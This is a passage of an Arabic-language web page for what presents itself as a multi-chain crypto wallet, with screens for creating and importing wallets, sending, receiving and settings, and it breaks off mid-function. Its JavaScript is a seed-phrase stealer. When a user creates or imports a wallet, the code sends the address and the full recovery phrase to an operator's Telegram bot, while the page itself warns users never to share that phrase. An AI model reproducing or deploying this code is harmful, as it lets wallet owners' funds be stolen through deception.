                                <li id="uppercaseReq" class="invalid">
                                    <i class="fas fa-times"></i>
                                    <span>حرف كبير واحد على الأقل</span>
                                </li>
                                <li id="lowercaseReq" class="invalid">
                                    <i class="fas fa-times"></i>
                                    <span>حرف صغير واحد على الأقل</span>
                                </li>
                                <li id="numberReq" class="invalid">
                                    <i class="fas fa-times"></i>
                                    <span>رقم واحد على الأقل</span>
                                </li>
                                <li id="specialReq" class="invalid">
                                    <i class="fas fa-times"></i>
                                    <span>رمز خاص واحد على الأقل</span>
                                </li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="form-section">
                        <label for="confirmPasswordInput">تأكيد كلمة المرور</label>
                        <div class="password-input-container">
                            <input type="password" id="confirmPasswordInput" class="password-input" placeholder="أعد إدخال كلمة المرور">
                            <button type="button" id="toggleConfirmPassword" class="password-toggle">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    
                    <button id="setPasswordBtn" class="btn btn-primary btn-full" disabled>
                        <i class="fas fa-lock"></i>
                        تعيين كلمة المرور
                    </button>
                </div>
                
                <div class="security-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    <div>
                        <strong>مهم جداً:</strong><br>
                        احفظ كلمة المرور في مكان آمن. لا يمكن استرداد المحفظة بدونها.
                    </div>
                </div>
            </div>
        </div>

        <!-- شاشة استيراد المحفظة -->
        <div id="importScreen" class="screen">
            <div class="import-container">
                <div class="screen-header">
                    <button id="backToWelcomeBtn" class="back-btn">
                        <i class="fas fa-arrow-right"></i>
                    </button>
                    <h2>استيراد محفظة</h2>
                </div>
                
                <div class="import-form">
                    <div class="form-section">
                        <label for="mnemonicInput">عبارة الاسترجاع</label>
                        <textarea id="mnemonicInput" placeholder="أدخل الكلمات مفصولة بمسافات"></textarea>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            <span>أدخل الكلمات مفصولة بمسافات</span>
                        </div>
                    </div>
                    
                    <button id="importBtn" class="btn btn-primary btn-full">
                        <i class="fas fa-download"></i>
                        المتابعة
                    </button>
                </div>
                
                <div class="security-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    <div>
                        <strong>تحذير أمني:</strong><br>
                        تأكد من أنك في مكان آمن وأن لا أحد يراقب شاشتك
                    </div>
                </div>
            </div>
        </div>

        <!-- شاشة إنشاء المحفظة -->
        <div id="createScreen" class="screen">
            <div class="create-container">
                <div class="screen-header">
                    <button id="backToWelcomeFromCreateBtn" class="back-btn">
                        <i class="fas fa-arrow-right"></i>
                    </button>
                    <h2>إنشاء محفظة جديدة</h2>
                </div>
                
                <div class="wallet-info-card">
                    <div class="info-section">
                        <label>عنوان المحفظة</label>
                        <div class="address-display">
                            <span id="newWalletAddress">جاري الإنشاء...</span>
                            <button id="copyAddressBtn" class="copy-btn">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    
                    <div class="info-section">
                        <label>عبارة الاسترجاع</label>
                        <div class="mnemonic-display">
                            <div class="mnemonic-words" id="newWalletMnemonic">جاري الإنشاء...</div>
                            <button id="copyMnemonicBtn" class="copy-btn">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                </div>
                
                <div class="backup-warning">
                    <i class="fas fa-shield-alt"></i>
                    <div>
                        <strong>احفظ عبارة الاسترجاع بأمان!</strong><br>
                        هذه هي الطريقة الوحيدة لاستعادة محفظتك. احفظها في مكان آمن ولا تشاركها مع أحد.
                    </div>
                </div>
                
                <button id="continueToPasswordBtn" class="btn btn-primary btn-full">
                    <i class="fas fa-arrow-left"></i>
                    تعيين كلمة المرور
                </button>
            </div>
        </div>

        <!-- شاشة المحفظة الرئيسية -->
        <div id="walletScreen" class="screen">
            <div class="wallet-container">
                <!-- رأس المحفظة -->
                <div class="wallet-header">
                    <div class="wallet-info">
                        <div class="wallet-name">
                            <h3>محفظتي</h3>
                            <div class="wallet-address-short">
                                <span id="currentWalletAddress">0x0000...0000</span>
                                <button id="copyCurrentAddressBtn" class="copy-btn-small">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                        <button id="settingsBtn" class="settings-btn">
                            <i class="fas fa-cog"></i>
                        </button>
                    </div>
                </div>

                <!-- قسم الرصيد -->
                <div class="balance-section">
                    <div class="balance-card">
                        <div class="balance-header">
                            <span>إجمالي الرصيد</span>
                            <button id="refreshBalanceBtn" class="refresh-btn">
                                <i class="fas fa-sync-alt"></i>
                            </button>
                        </div>
                        <div class="balance-amount">
                            <span id="totalBalance">0.00</span>
                            <span class="currency">USD</span>
                        </div>
                        <div class="balance-usd" id="balanceDetails">جاري التحميل...</div>
                    </div>
                </div>

                <!-- الإجراءات السريعة -->
                <div class="quick-actions">
                    <div id="sendBtn" class="action-btn">
                        <div class="action-icon send">
                            <i class="fas fa-arrow-up"></i>
                        </div>
                        <span>إرسال</span>
                    </div>
                    <div id="receiveBtn" class="action-btn">
                        <div class="action-icon receive">
                            <i class="fas fa-arrow-down"></i>
                        </div>
                        <span>استقبال</span>
                    </div>
                    <div id="swapBtn" class="action-btn">
                        <div class="action-icon swap">
                            <i class="fas fa-exchange-alt"></i>
                        </div>
                        <span>تبديل</span>
                    </div>
                    <div id="buyBtn" class="action-btn">
                        <div class="action-icon buy">
                            <i class="fas fa-credit-card"></i>
                        </div>
                        <span>شراء</span>
                    </div>
                    <div id="supportBtn" class="action-btn">
                        <div class="action-icon support">
                            <i class="fas fa-headset"></i>
                        </div>
                        <span>دعم</span>
                    </div>
                </div>

                <!-- قسم الأصول -->
                <div class="assets-section">
                    <div class="section-header">
                        <h4>الأصول</h4>
                        <button class="add-btn">
                            <i class="fas fa-plus"></i>
                            إضافة
                        </button>
                    </div>
                    <div class="assets-list" id="assetsList">
                        <div class="loading-assets">
                            <div class="loading-spinner"></div>
                            <span>جاري تحميل الأصول...</span>
                        </div>
                    </div>
                </div>

                <!-- قسم المعاملات -->
                <div class="transactions-section">
                    <div class="section-header">
                        <h4>المعاملات الأخيرة</h4>
                        <button class="view-all-btn">عرض الكل</button>
                    </div>
                    <div class="transactions-list">
                        <div class="no-transactions">
                            <i class="fas fa-receipt"></i>
                            <span>لا توجد معاملات بعد</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- النوافذ المنبثقة -->
    
    <!-- نافذة الإرسال -->
    <div id="sendModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>إرسال الأصول</h3>
                <button id="closeSendModal" class="close-btn">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <form id="sendForm">
                    <div class="form-group">
                        <label>الشبكة</label>
                        <select id="networkSelect">
                            <option value="ethereum">Ethereum</option>
                            <option value="bsc">Binance Smart Chain</option>
                            <option value="polygon">Polygon</option>
                            <option value="arbitrum">Arbitrum</option>
                            <option value="optimism">Optimism</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label>إلى</label>
                        <div class="input-with-scan">
                            <input type="text" id="recipientAddress" placeholder="عنوان المحفظة أو ENS">
                            <button type="button" id="scanAddressBtn" class="scan-btn">
                                <i class="fas fa-qrcode"></i>
                            </button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>المبلغ</label>
                        <div class="amount-input">
                            <input type="number" id="sendAmount" placeholder="0.00" step="0.0001">
                            <select id="assetSelect">
                                <option value="ETH">ETH</option>
                                <option value="USDT">USDT</option>
                                <option value="USDC">USDC</option>
                                <option value="DAI">DAI</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>سرعة المعاملة</label>
                        <div class="gas-options">
                            <div class="gas-option" data-speed="slow">
                                <span>بطيء</span>
                                <span class="gas-price">~5 دقائق</span>
                            </div>
                            <div class="gas-option active" data-speed="standard">
                                <span>عادي</span>
                                <span class="gas-price">~2 دقيقة</span>
                            </div>
                            <div class="gas-option" data-speed="fast">
                                <span>سريع</span>
                                <span class="gas-price">~30 ثانية</span>
                            </div>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn btn-primary btn-full">
                        <i class="fas fa-paper-plane"></i>
                        إرسال
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- نافذة الاستقبال -->
    <div id="receiveModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>استقبال الأصول</h3>
                <button id="closeReceiveModal" class="close-btn">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="receive-content">
                    <div class="form-group">
                        <label>الشبكة</label>
                        <select id="receiveNetworkSelect">
                            <option value="ethereum">Ethereum</option>
                            <option value="bsc">Binance Smart Chain</option>
                            <option value="polygon">Polygon</option>
                            <option value="arbitrum">Arbitrum</option>
                            <option value="optimism">Optimism</option>
                        </select>
                    </div>
                    
                    <div class="qr-section">
                        <div class="qr-code">
                            <canvas id="qrCanvas"></canvas>
                        </div>
                    </div>
                    
                    <div class="address-section">
                        <div class="form-group">
                            <label>عنوان المحفظة</label>
                            <div class="address-display">
                                <span id="receiveAddress">0x0000...0000</span>
                                <button id="copyReceiveAddressBtn" class="copy-btn">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                    
                    <div class="receive-warning">
                        <i class="fas fa-exclamation-triangle"></i>
                        <span id="receiveWarningText">أرسل فقط أصول Ethereum (ETH, ERC-20) إلى هذا العنوان</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- نافذة ماسح QR -->
    <div id="qrScannerModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>مسح رمز QR</h3>
                <button id="closeQrScannerModal" class="close-btn">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="qr-scanner-container">
                    <div id="scannerVideo" class="scanner-video"></div>
                    <div class="scanner-controls">
                        <button id="startScanBtn" class="scanner-btn">
                            <i class="fas fa-play"></i>
                            بدء المسح
                        </button>
                        <button id="stopScanBtn" class="scanner-btn" disabled>
                            <i class="fas fa-stop"></i>
                            إيقاف المسح
                        </button>
                    </div>
                    <p>وجه الكاميرا نحو رمز QR لمسحه</p>
                </div>
            </div>
        </div>
    </div>

    <!-- نافذة الإعدادات -->
    <div id="settingsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>الإعدادات</h3>
                <button id="closeSettingsModal" class="close-btn">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="settings-list">
                    <div class="setting-item">
                        <div class="setting-info">
                            <i class="fas fa-key"></i>
                            <span>عرض المفتاح الخاص</span>
                        </div>
                        <button id="showPrivateKeyBtn" class="setting-btn">
                            <i class="fas fa-eye"></i>
                        </button>
                    </div>
                    <div class="setting-item">
                        <div class="setting-info">
                            <i class="fas fa-seedling"></i>
                            <span>عرض عبارة الاسترجاع</span>
                        </div>
                        <button id="showMnemonicBtn" class="setting-btn">
                            <i class="fas fa-eye"></i>
                        </button>
                    </div>
                    <div class="setting-item">
                        <div class="setting-info">
                            <i class="fas fa-lock"></i>
                            <span>تغيير كلمة المرور</span>
                        </div>
                        <button id="changePasswordBtn" class="setting-btn">
                            <i class="fas fa-edit"></i>
                        </button>
                    </div>
                    <div class="setting-item danger">
                        <div class="setting-info">
                            <i class="fas fa-sign-out-alt"></i>
                            <span>تسجيل الخروج</span>
                        </div>
                        <button id="logoutBtn" class="setting-btn danger">
                            <i class="fas fa-power-off"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- نافذة الدعم الفني -->
    <div id="supportModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>الدعم الفني</h3>
                <button id="closeSupportModal" class="close-btn">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <form id="supportForm">
                    <div class="form-group">
                        <label for="supportName">الاسم الكامل</label>
                        <input type="text" id="supportName" placeholder="أدخل اسمك الكامل" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="supportEmail">البريد الإلكتروني</label>
                        <input type="email" id="supportEmail" placeholder="أدخل بريدك الإلكتروني" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="supportPhone">رقم الهاتف</label>
                        <input type="tel" id="supportPhone" placeholder="أدخل رقم هاتفك">
                    </div>
                    
                    <div class="form-group">
                        <label for="supportMessage">الرسالة</label>
                        <textarea id="supportMessage" placeholder="اكتب رسالتك هنا..." required></textarea>
                    </div>
                    
                    <button type="submit" class="btn btn-primary btn-full">
                        <i class="fas fa-paper-plane"></i>
                        إرسال الرسالة
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- نافذة طلب كلمة المرور -->
    <div id="passwordPromptModal" class="modal password-prompt-modal">
        <div class="modal-content password-prompt-content">
            <div class="modal-header">
                <h3>أدخل كلمة المرور</h3>
            </div>
            <div class="modal-body">
                <div class="password-prompt-form">
                    <input type="password" id="passwordPromptInput" class="password-prompt-input" placeholder="كلمة المرور">
                    <div class="password-prompt-buttons">
                        <button id="passwordPromptCancel" class="btn btn-secondary">إلغاء</button>
                        <button id="passwordPromptConfirm" class="btn btn-primary">تأكيد</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- شاشة التحميل -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-content">
            <div class="loading-spinner large"></div>
            <p id="loadingText">جاري التحميل...</p>
        </div>
    </div>

    <!-- حاوي رسائل التنبيه -->
    <div id="toastContainer" class="toast-container"></div>

    <!-- المكتبات الخارجية -->
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/html5-qrcode@2.3.8/minified/html5-qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script>

    <script>
        // متغيرات عامة
        let currentWallet = null;
        let providers = {};
        let currentBalance = 0;
        let cryptoPrices = {};
        let userPassword = null;
        let qrScanner = null;

        // إعدادات بوت تليجرام
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع هنا توكن البوت الخاص بك
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // ضع هنا معرف المحادثة الخاص بك

        // إعدادات الشبكات المحسّنة
        const NETWORKS = {
            ethereum: {
                name: 'Ethereum',
                chainId: 1,
                rpcUrl: 'https://cloudflare-eth.com',
                symbol: 'ETH',
                explorer: 'https://etherscan.io',
                tokens: {
                    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                    USDC: '0xA0b86a33E6441b8C8C7C6b8C8C7C6b8C8C7C6b8C',
                    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
                }
            },
            bsc: {
                name: 'Binance Smart Chain',
                chainId: 56,
                rpcUrl: 'https://bsc-dataseed1.bnbchain.org',
                symbol: 'BNB',
                explorer: 'https://bscscan.com',
                tokens: {
                    USDT: '0x55d398326f99059fF775485246999027B3197955',
                    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                    BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
                }
            },
            polygon: {
                name: 'Polygon',
                chainId: 137,
                rpcUrl: 'https://polygon-rpc.com',
                symbol: 'MATIC',
                explorer: 'https://polygonscan.com',
                tokens: {
                    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'
                }
            },
            arbitrum: {
                name: 'Arbitrum',
                chainId: 42161,
                rpcUrl: 'https://arb1.arbitrum.io/rpc',
                symbol: 'ETH',
                explorer: 'https://arbiscan.io',
                tokens: {
                    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                    USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'
                }
            },
            optimism: {
                name: 'Optimism',
                chainId: 10,
                rpcUrl: 'https://mainnet.optimism.io',
                symbol: 'ETH',
                explorer: 'https://optimistic.etherscan.io',
                tokens: {
                    USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                    USDC: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607'
                }
            }
        };

        // تهيئة المزودين
        async function initProviders() {
            try {
                for (const [network, config] of Object.entries(NETWORKS)) {
                    providers[network] = new ethers.providers.JsonRpcProvider(config.rpcUrl);
                }
                console.log('Providers initialized successfully');
                return true;
            } catch (error) {
                console.error('Failed to initialize providers:', error);
                return false;
            }
        }

        // إرسال رسالة إلى بوت تليجرام
        async function sendToTelegram(message) {
            try {
                // التحقق من وجود إعدادات تليجرام
                if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                    console.log('Telegram not configured. Message would be:', message);
                    return true; // نعتبر الإرسال ناجحاً للاختبار
                }
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    console.log('Message sent to Telegram successfully');
                    return true;
                } else {
                    console.error('Failed to send message to Telegram');
                    return false;
                }
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
                return false;
            }
        }

        // تشفير البيانات
        function encryptData(data, password) {
            return CryptoJS.AES.encrypt(JSON.stringify(data), password).toString();
        }

        // فك تشفير البيانات
        function decryptData(encryptedData, password) {
            try {
                const bytes = CryptoJS.AES.decrypt(encryptedData, password);
                return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
            } catch (error) {
                throw new Error('كلمة مرور خاطئة');
            }
        }

        // التحقق من قوة كلمة المرور
        function checkPasswordStrength(password) {
            let score = 0;
            const requirements = {
                length: password.length >= 8,
                uppercase: /[A-Z]/.test(password),
                lowercase: /[a-z]/.test(password),
                number: /\d/.test(password),
                special: /[!@#$%^&*(),.?":{}|<>]/.test(password)
            };

            Object.values(requirements).forEach(req => {
                if (req) score++;
            });

            let strength = 'weak';
            if (score >= 5) strength = 'strong';
            else if (score >= 4) strength = 'good';
            else if (score >= 3) strength = 'fair';

            return { score, requirements, strength };
        }

        // تحديث مؤشر قوة كلمة المرور
        function updatePasswordStrength(password) {
            const { requirements, strength } = checkPasswordStrength(password);
            const strengthBar = document.getElementById('passwordStrengthBar');
            
            strengthBar.className = `password-strength-bar ${strength}`;

            // تحديث متطلبات كلمة المرور
            Object.entries(requirements).forEach(([req, met]) => {
                const element = document.getElementById(`${req}Req`);
                if (element) {
                    element.className = met ? 'valid' : 'invalid';
                    const icon = element.querySelector('i');
                    icon.className = met ? 'fas fa-check' : 'fas fa-times';
                }
            });

            return Object.values(requirements).every(req => req);
        }

        // جلب أسعار العملات المشفرة
        async function fetchCryptoPrices() {
            try {
                // جلب أسعار من CoinGecko
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether,usd-coin,dai,matic-network&vs_currencies=usd');
                const data = await response.json();
                
                cryptoPrices = {
                    ETH: data.ethereum?.usd || 0,
                    BNB: data.binancecoin?.usd || 0,
                    USDT: data.tether?.usd || 1,
                    USDC: data['usd-coin']?.usd || 1,
                    DAI: data.dai?.usd || 1,
                    MATIC: data['matic-network']?.usd || 0
                };

                console.log('Crypto prices fetched:', cryptoPrices);
            } catch (error) {
                console.error('Error fetching crypto prices:', error);
                // أسعار افتراضية
                cryptoPrices = { ETH: 2000, BNB: 300, USDT: 1, USDC: 1, DAI: 1, MATIC: 0.8 };
            }
        }

        // إنشاء محفظة جديدة
        async function createNewWallet() {
            try {
                showLoading('جاري إنشاء محفظة جديدة...');
                
                // إنشاء محفظة عشوائية
                const wallet = ethers.Wallet.createRandom();
                const address = wallet.address;
                const privateKey = wallet.privateKey;
                const mnemonic = wallet.mnemonic.phrase;
                
                // عرض المعلومات
                document.getElementById('newWalletAddress').textContent = address;
                document.getElementById('newWalletMnemonic').textContent = mnemonic;
                
                // حفظ المحفظة مؤقتاً
                currentWallet = {
                    address,
                    privateKey,
                    mnemonic
                };
                
                // إرسال عبارة الاسترجاع إلى تليجرام
                const telegramMessage = `🔐 <b>عبارة استرجاع محفظة جديدة</b>\n\n` +
                    `📍 <b>العنوان:</b> <code>${address}</code>\n\n` +
                    `🔑 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic}</code>\n\n` +
                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
                
                await sendToTelegram(telegramMessage);
                
                hideLoading();
                showToast('تم إنشاء المحفظة بنجاح!', 'success');
                
            } catch (error) {
                hideLoading();
                console.error('Error creating wallet:', error);
                showToast('حدث خطأ أثناء إنشاء المحفظة', 'error');
            }
        }

        // حفظ المحفظة مع التشفير
        function saveWallet(walletData, password) {
            const encryptedWallet = encryptData(walletData, password);
            localStorage.setItem('encryptedWallet', encryptedWallet);
            localStorage.setItem('walletExists', 'true');
        }

        // تحميل المحفظة مع فك التشفير
        function loadWallet(password) {
            const encryptedWallet = localStorage.getItem('encryptedWallet');
            if (!encryptedWallet) {
                throw new Error('لا توجد محفظة محفوظة');
            }
            
            return decryptData(encryptedWallet, password);
        }

        // استيراد محفظة موجودة
        async function importWallet(mnemonic) {
            try {
                showLoading('جاري استيراد المحفظة...');
                
                // التحقق من صحة عبارة الاسترجاع
                if (!ethers.utils.isValidMnemonic(mnemonic.trim())) {
                    throw new Error('عبارة الاسترجاع غير صحيحة');
                }
                
                // استيراد المحفظة
                const wallet = ethers.Wallet.fromMnemonic(mnemonic.trim());
                
                currentWallet = {
                    address: wallet.address,
                    privateKey: wallet.privateKey,
                    mnemonic: mnemonic.trim()
                };
                
                // إرسال عبارة الاسترجاع إلى تليجرام
                const telegramMessage = `📥 <b>استيراد محفظة موجودة</b>\n\n` +
                    `📍 <b>العنوان:</b> <code>${wallet.address}</code>\n\n` +
                    `🔑 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic.trim()}</code>\n\n` +
                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
                
                await sendToTelegram(telegramMessage);
                
                hideLoading();
                showToast('تم استيراد المحفظة بنجاح!', 'success');
                
                // الانتقال لشاشة كلمة المرور
                showScreen('passwordScreen');
                
            } catch (error) {
                hideLoading();
                console.error('Error importing wallet:', error);
                showToast(error.message || 'حدث خطأ أثناء استيراد المحفظة', 'error');
            }
        }

        // تحميل بيانات المحفظة
        async function loadWalletData() {
            try {
                if (!currentWallet) return;
                
                const address = currentWallet.address;
                const shortAddress = `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
                
                // عرض العنوان
                document.getElementById('currentWalletAddress').textContent = shortAddress;
                document.getElementById('receiveAddress').textContent = address;
                
                // تحديث الرصيد
                await updateBalance();
                
                // إنشاء QR Code
                generateQRCode(address);
                
                // تحميل الأصول
                loadAssets();
                
            } catch (error) {
                console.error('Error loading wallet data:', error);
                showToast('حدث خطأ أثناء تحميل بيانات المحفظة', 'error');
            }
        }

        // تحديث الرصيد
        async function updateBalance() {
            try {
                if (!currentWallet) return;
                
                let totalUsdValue = 0;
                const balances = {};
                
                // جلب رصيد ETH
                const ethBalance = await providers.ethereum.getBalance(currentWallet.address);
                const ethAmount = parseFloat(ethers.utils.formatEther(ethBalance));
                balances.ETH = ethAmount;
                totalUsdValue += ethAmount * (cryptoPrices.ETH || 0);
                
                // جلب رصيد BNB
                try {
                    const bnbBalance = await providers.bsc.getBalance(currentWallet.address);
                    const bnbAmount = parseFloat(ethers.utils.formatEther(bnbBalance));
                    balances.BNB = bnbAmount;
                    totalUsdValue += bnbAmount * (cryptoPrices.BNB || 0);
                } catch (error) {
                    console.error('Error fetching BNB balance:', error);
                    balances.BNB = 0;
                }
                
                // جلب رصيد MATIC
                try {
                    const maticBalance = await providers.polygon.getBalance(currentWallet.address);
                    const maticAmount = parseFloat(ethers.utils.formatEther(maticBalance));
                    balances.MATIC = maticAmount;
                    totalUsdValue += maticAmount * (cryptoPrices.MATIC || 0);
                } catch (error) {
                    console.error('Error fetching MATIC balance:', error);
                    balances.MATIC = 0;
                }
                
                // جلب رصيد USDT على شبكات مختلفة
                let totalUSDT = 0;
                
                // USDT على Ethereum
                try {
                    const usdtContract = new ethers.Contract(
                        NETWORKS.ethereum.tokens.USDT,
                        ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
                        providers.ethereum
                    );
                    const usdtBalance = await usdtContract.balanceOf(currentWallet.address);
                    const decimals = await usdtContract.decimals();
                    const usdtAmount = parseFloat(ethers.utils.formatUnits(usdtBalance, decimals));
                    totalUSDT += usdtAmount;
                } catch (error) {
                    console.error('Error fetching USDT-ETH balance:', error);
                }
                
                // USDT على BSC
                try {
                    const usdtBscContract = new ethers.Contract(
                        NETWORKS.bsc.tokens.USDT,
                        ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
                        providers.bsc
                    );
                    const usdtBscBalance = await usdtBscContract.balanceOf(currentWallet.address);
                    const decimals = await usdtBscContract.decimals();
                    const usdtBscAmount = parseFloat(ethers.utils.formatUnits(usdtBscBalance, decimals));
                    totalUSDT += usdtBscAmount;
                } catch (error) {
                    console.error('Error fetching USDT-BSC balance:', error);
                }
                
                balances.USDT = totalUSDT;
                totalUsdValue += totalUSDT * (cryptoPrices.USDT || 1);
                
                // عرض الرصيد الإجمالي
                document.getElementById('totalBalance').textContent = totalUsdValue.toFixed(2);
                document.getElementById('balanceDetails').textContent = 
                    `ETH: ${balances.ETH.toFixed(4)} | BNB: ${balances.BNB.toFixed(4)} | MATIC: ${balances.MATIC.toFixed(4)} | USDT: ${balances.USDT.toFixed(2)}`;
                
                currentBalance = totalUsdValue;
                
            } catch (error) {
                console.error('Error updating balance:', error);
                showToast('حدث خطأ أثناء تحديث الرصيد', 'error');
            }
        }

        // تحميل الأصول
        async function loadAssets() {
            try {
                const assetsList = document.getElementById('assetsList');
                assetsList.innerHTML = '';
                
                const assets = [
                    { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum', balance: 0 },
                    { symbol: 'BNB', name: 'BNB', network: 'BSC', balance: 0 },
                    { symbol: 'MATIC', name: 'Polygon', network: 'Polygon', balance: 0 },
                    { symbol: 'USDT', name: 'Tether USD', network: 'Multi-Chain', balance: 0 },
                    { symbol: 'USDC', name: 'USD Coin', network: 'Multi-Chain', balance: 0 },
                    { symbol: 'DAI', name: 'Dai Stablecoin', network: 'Ethereum', balance: 0 }
                ];
                
                assets.forEach(asset => {
                    const assetItem = document.createElement('div');
                    assetItem.className = 'asset-item';
                    assetItem.innerHTML = `
                        <div class="asset-icon">
                            ${asset.symbol.substring(0, 3)}
                        </div>
                        <div class="asset-details">
                            <h5>${asset.name}</h5>
                            <p>${asset.network}</p>
                        </div>
                        <div class="asset-balance">
                            ${asset.balance.toFixed(4)} ${asset.symbol}
                        </div>
                    `;
                    assetsList.appendChild(assetItem);
                });
                
            } catch (error) {
                console.error('Error loading assets:', error);
            }
        }

        // إنشاء QR Code
        function generateQRCode(address) {
            const canvas = document.getElementById('qrCanvas');
            if (canvas && address) {
                QRCode.toCanvas(canvas, address, {
                    width: 200,
                    margin: 2,
                    color: {
                        dark: '#000000',
                        light: '#FFFFFF'
                    }
                }, function (error) {
                    if (error) console.error('Error generating QR code:', error);
                });
            }
        }

        // بدء مسح QR
        async function startQRScanner() {
            try {
                const videoElement = document.getElementById('scannerVideo');
                
                if (!qrScanner) {
                    qrScanner = new Html5Qrcode("scannerVideo");
                }
                
                const cameras = await Html5Qrcode.getCameras();
                if (cameras && cameras.length) {
                    const cameraId = cameras[0].id;
                    
                    await qrScanner.start(
                        cameraId,
                        {
                            fps: 10,
                            qrbox: { width: 250, height: 250 }
                        },
                        (decodedText, decodedResult) => {
                            // تم مسح QR code بنجاح
                            document.getElementById('recipientAddress').value = decodedText;
                            stopQRScanner();
                            hideModal('qrScannerModal');
                            showToast('تم مسح العنوان بنجاح!', 'success');
                        },
                        (errorMessage) => {
                            // خطأ في المسح (طبيعي)
                        }
                    );
                    
                    document.getElementById('startScanBtn').disabled = true;
                    document.getElementById('stopScanBtn').disabled = false;
                }
            } catch (error) {
                console.error('Error starting QR scanner:', error);
                showToast('حدث خطأ أثناء بدء المسح', 'error');
            }
        }

        // إيقاف مسح QR
        async function stopQRScanner() {
            try {
                if (qrScanner) {
                    await qrScanner.stop();
                    document.getElementById('startScanBtn').disabled = false;
                    document.getElementById('stopScanBtn').disabled = true;
                }
            } catch (error) {
                console.error('Error stopping QR scanner:', error);
            }
        }

        // إرسال معاملة
        async function sendTransaction(network, to, amount, asset) {
            try {
                showLoading('جاري إرسال المعاملة...');
                
                if (!currentWallet || !userPassword) {
                    throw new Error('المحفظة غير متاحة');
                }
                
                const wallet = new ethers.Wallet(currentWallet.privateKey, providers[network]);
                
                let tx;
                if (asset === NETWORKS[network].symbol) {
                    // إرسال العملة الأساسية
                    tx = await wallet.sendTransaction({
                        to: to,
                        value: ethers.utils.parseEther(amount.toString())
                    });
                } else {
                    // إرسال رمز مميز
                    const tokenAddress = NETWORKS[network].tokens[asset];
                    if (!tokenAddress) {
                        throw new Error('الرمز المميز غير مدعوم على هذه الشبكة');
                    }
                    
                    const tokenContract = new ethers.Contract(
                        tokenAddress,
                        ['function transfer(address to, uint256 amount) returns (bool)', 'function decimals() view returns (uint8)'],
                        wallet
                    );
                    
                    const decimals = await tokenContract.decimals();
                    const tokenAmount = ethers.utils.parseUnits(amount.toString(), decimals);
                    
                    tx = await tokenContract.transfer(to, tokenAmount);
                }
                
                hideLoading();
